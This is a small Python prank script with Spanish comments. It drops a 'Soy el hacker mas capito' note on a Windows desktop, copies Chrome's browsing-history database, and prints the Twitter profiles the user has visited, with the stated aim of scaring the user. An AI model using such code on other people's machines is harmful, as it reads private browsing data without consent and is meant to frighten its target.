import os
import re
import sqlite3
from pathlib import Path
from shutil import copyfile
from time import sleep


def get_user_path():
    return "{}\\".format(Path.home())


def check_history(hacker_file, chrome_history):
    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            print(results[0])


def create_hacker_mascapito():
    desktop_path = "C:\\Users\\" + os.getlogin() + "\\Desktop\\"
    hacker_file = open(desktop_path + "LEEME.txt", "w")
    hacker_file.write("Soy el hacker mas capito")
    return hacker_file


def get_chrome_history():
    history_path = "C:\\Users\\" + os.getlogin() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    urls = None
    while not urls:
        try:
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FRom urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(3)


def main():
    # sleep(10)
    # Calculamos la user path
    user_path = get_user_path()
    # Creamos el archivo mascapito en el escritorio
    hacker_file = create_hacker_mascapito()
    # Recogemos el historial de google chrome
    chrome_history = get_chrome_history()
    # asustamos al usuario, boooooo te asusto
    check_history(hacker_file, chrome_history)


if __name__ == "__main__":
    main()
